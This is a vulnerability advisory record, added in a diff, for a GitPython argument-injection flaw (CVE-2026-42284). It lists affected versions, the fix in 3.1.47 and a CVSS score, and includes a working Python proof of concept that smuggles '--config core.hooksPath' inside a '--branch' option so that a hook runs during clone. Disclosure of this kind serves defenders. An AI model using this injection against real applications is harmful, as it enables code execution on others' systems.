@@ -1,0 +1,242 @@
+advisory_id: GHSA-x2qx-6953-8485
+datasource_id: github_osv/GHSA-x2qx-6953-8485
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-x2qx-6953-8485/GHSA-x2qx-6953-8485.json
+aliases:
+  - CVE-2026-42284
+summary: |
+  GitPython: Unsafe option check validates multi_options before shlex.split transformation
+  ### Summary
+
+  `_clone()` validates `multi_options` as the original list, then executes `shlex.split(" ".join(multi_options))`. A string like `"--branch main --config core.hooksPath=/x"` passes validation (starts with `--branch`), but after split becomes `["--branch", "main", "--config", "core.hooksPath=/x"]`. Git applies the config and executes attacker hooks during clone.
+
+  ### Details
+
+  The vulnerable code is in [`git/repo/base.py` line 1383](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/repo/base.py#L1383):
+  ```python
+  multi = shlex.split(" ".join(multi_options))
+  ```
+
+  Then validation runs on the **original** list at [line 1390](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/repo/base.py#L1390):
+  ```python
+  Git.check_unsafe_options(options=multi_options, unsafe_options=cls.unsafe_git_clone_options)
+  ```
+
+  Then execution uses the **transformed** result at [line 1392](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/repo/base.py#L1392):
+  ```python
+  proc = git.clone(multi, "--", url, path, ...)
+  ```
+
+  The [check at `git/cmd.py` line 959](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/cmd.py#L959) uses `startswith`:
+  ```python
+  if option.startswith(unsafe_option) or option == bare_option:
+  ```
+
+  `"--branch main --config ..."` does not start with `"--config"`, so it passes. After `shlex.split`, `"--config"` becomes its own token and reaches git.
+
+  Also affects `Submodule.update()` via `clone_multi_options`.
+
+  ### PoC
+
+  ```python
+  import sys, pathlib, subprocess
+  sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
+
+  from git import Repo
+  from git.exc import UnsafeOptionError
+
+  try:
+      Repo.clone_from("/nonexistent", "/tmp/x", multi_options=["--config", "core.hooksPath=/x"])
+  except UnsafeOptionError:
+      print("multi_options=['--config', '...']: Block as expected")
+  except Exception:
+      pass
+
+  DIR = pathlib.Path(__file__).resolve().parent / "workdir_b"
+  SRC = DIR / "repo"
+  DST = DIR / "dst"
+  HOOKS = DIR / "hooks"
+  LOG = DIR / "output.log"
+
+  if not SRC.exists():
+      SRC.mkdir(parents=True)
+      r = lambda *a: subprocess.run(a, cwd=SRC, capture_output=True)
+      r("git", "init", "-b", "main")
+      (SRC / "f").write_text("x\n")
+      r("git", "add", ".")
+      r("git", "commit", "-m", "init")
+
+  HOOKS.mkdir(exist_ok=True)
+  hook = HOOKS / "post-checkout"
+  hook.write_text(f"#!/bin/sh\nwhoami > {LOG.as_posix()}\nhostname >> {LOG.as_posix()}\n")
+  hook.chmod(0o755)
+
+  LOG.unlink(missing_ok=True)
+  payload = "--branch main --config core.hooksPath=" + HOOKS.as_posix()
+
+  try:
+      Repo.clone_from(str(SRC), str(DST), multi_options=[payload])
+  except UnsafeOptionError:
+      print(f"multi_options=['{payload}']: BLOCKED"); sys.exit(1)
+  except Exception:
+      pass
+
+  if not LOG.exists() and DST.exists():
+      subprocess.run(["git", "checkout", "--force", "main"], cwd=DST, capture_output=True)
+
+  print(f"multi_options=['{payload}']: not blocked")
+  print(f"\nHook executed: {LOG.exists()}")
+  if LOG.exists():
+      print(LOG.read_text().strip())
+  ```
+
+  **Output:**
+  ```
+  multi_options=['--config', '...']: Block as expected
+  multi_options=['--branch main --config core.hooksPath=.../hooks']: not blocked
+
+  Hook executed: True
+  texugo
+  DESKTOP-5w5HH79
+  ```
+
+  ### Impact
+
+  Any application passing user input to `multi_options` in `clone_from()`, `clone()`, or `Submodule.update()` is vulnerable. Attacker embeds `--config core.hooksPath=<dir>` inside a string starting with a safe option. Check does not block it. Git executes attacker code. Same class as CVE-2023-40267.
+impacted_packages:
+  - purl: pkg:pypi/gitpython
+    affected_versions: vers:pypi/<3.1.47
+    fixed_versions: vers:pypi/3.1.47
+    affected_packages:
+      - pkg:pypi/gitpython@0.1.7
+      - pkg:pypi/gitpython@0.2.0b1
+      - pkg:pypi/gitpython@0.3.0b1
+      - pkg:pypi/gitpython@0.3.0b2
+      - pkg:pypi/gitpython@0.3.1b2
+      - pkg:pypi/gitpython@0.3.2rc1
+      - pkg:pypi/gitpython@0.3.2
+      - pkg:pypi/gitpython@0.3.2.1
+      - pkg:pypi/gitpython@0.3.3
+      - pkg:pypi/gitpython@0.3.4
+      - pkg:pypi/gitpython@0.3.5
+      - pkg:pypi/gitpython@0.3.6
+      - pkg:pypi/gitpython@0.3.7
+      - pkg:pypi/gitpython@1.0.0
+      - pkg:pypi/gitpython@1.0.1
+      - pkg:pypi/gitpython@1.0.2
+      - pkg:pypi/gitpython@2.0.0
+      - pkg:pypi/gitpython@2.0.1
+      - pkg:pypi/gitpython@2.0.2
+      - pkg:pypi/gitpython@2.0.3
+      - pkg:pypi/gitpython@2.0.4
+      - pkg:pypi/gitpython@2.0.5
+      - pkg:pypi/gitpython@2.0.6
+      - pkg:pypi/gitpython@2.0.7
+      - pkg:pypi/gitpython@2.0.8
+      - pkg:pypi/gitpython@2.0.9.dev0
+      - pkg:pypi/gitpython@2.0.9.dev1
+      - pkg:pypi/gitpython@2.0.9
+      - pkg:pypi/gitpython@2.1.0
+      - pkg:pypi/gitpython@2.1.1
+      - pkg:pypi/gitpython@2.1.2
+      - pkg:pypi/gitpython@2.1.3
+      - pkg:pypi/gitpython@2.1.4
+      - pkg:pypi/gitpython@2.1.5
+      - pkg:pypi/gitpython@2.1.6
+      - pkg:pypi/gitpython@2.1.7
+      - pkg:pypi/gitpython@2.1.8
+      - pkg:pypi/gitpython@2.1.9
+      - pkg:pypi/gitpython@2.1.10
+      - pkg:pypi/gitpython@2.1.11
+      - pkg:pypi/gitpython@2.1.12
+      - pkg:pypi/gitpython@2.1.13
+      - pkg:pypi/gitpython@2.1.14
+      - pkg:pypi/gitpython@2.1.15
+      - pkg:pypi/gitpython@3.0.0
+      - pkg:pypi/gitpython@3.0.1
+      - pkg:pypi/gitpython@3.0.2
+      - pkg:pypi/gitpython@3.0.3
+      - pkg:pypi/gitpython@3.0.4
+      - pkg:pypi/gitpython@3.0.5
+      - pkg:pypi/gitpython@3.0.6
+      - pkg:pypi/gitpython@3.0.7
+      - pkg:pypi/gitpython@3.0.8
+      - pkg:pypi/gitpython@3.0.9
+      - pkg:pypi/gitpython@3.1.0
+      - pkg:pypi/gitpython@3.1.1
+      - pkg:pypi/gitpython@3.1.2
+      - pkg:pypi/gitpython@3.1.3
+      - pkg:pypi/gitpython@3.1.4
+      - pkg:pypi/gitpython@3.1.5
+      - pkg:pypi/gitpython@3.1.6
+      - pkg:pypi/gitpython@3.1.7
+      - pkg:pypi/gitpython@3.1.8
+      - pkg:pypi/gitpython@3.1.9
+      - pkg:pypi/gitpython@3.1.10
+      - pkg:pypi/gitpython@3.1.11
+      - pkg:pypi/gitpython@3.1.12
+      - pkg:pypi/gitpython@3.1.13
+      - pkg:pypi/gitpython@3.1.14
+      - pkg:pypi/gitpython@3.1.15
+      - pkg:pypi/gitpython@3.1.16
+      - pkg:pypi/gitpython@3.1.17
+      - pkg:pypi/gitpython@3.1.18
+      - pkg:pypi/gitpython@3.1.19
+      - pkg:pypi/gitpython@3.1.20
+      - pkg:pypi/gitpython@3.1.22
+      - pkg:pypi/gitpython@3.1.23
+      - pkg:pypi/gitpython@3.1.24
+      - pkg:pypi/gitpython@3.1.25
+      - pkg:pypi/gitpython@3.1.26
+      - pkg:pypi/gitpython@3.1.27
+      - pkg:pypi/gitpython@3.1.28
+      - pkg:pypi/gitpython@3.1.29
+      - pkg:pypi/gitpython@3.1.30
+      - pkg:pypi/gitpython@3.1.31
+      - pkg:pypi/gitpython@3.1.32
+      - pkg:pypi/gitpython@3.1.33
+      - pkg:pypi/gitpython@3.1.34
+      - pkg:pypi/gitpython@3.1.35
+      - pkg:pypi/gitpython@3.1.36
+      - pkg:pypi/gitpython@3.1.37
+      - pkg:pypi/gitpython@3.1.38
+      - pkg:pypi/gitpython@3.1.40
+      - pkg:pypi/gitpython@3.1.41
+      - pkg:pypi/gitpython@3.1.42
+      - pkg:pypi/gitpython@3.1.43
+      - pkg:pypi/gitpython@3.1.44
+      - pkg:pypi/gitpython@3.1.45
+      - pkg:pypi/gitpython@3.1.46
+    fixed_packages:
+      - pkg:pypi/gitpython@3.1.47
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '8.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-x2qx-6953-8485/GHSA-x2qx-6953-8485.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-88
+references:
+  - url: https://github.com/gitpython-developers/GitPython
+    reference_type:
+    reference_id:
+  - url: https://github.com/gitpython-developers/GitPython/releases/tag/3.1.47
+    reference_type:
+    reference_id:
+  - url: https://www.tenable.com/cve/CVE-2026-32686
+    reference_type:
+    reference_id: CVE-2026-32686
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-42284
+    reference_type:
+    reference_id: CVE-2026-42284
+  - url: https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-x2qx-6953-8485
+    reference_type:
+    reference_id: GHSA-x2qx-6953-8485
+exploits: []
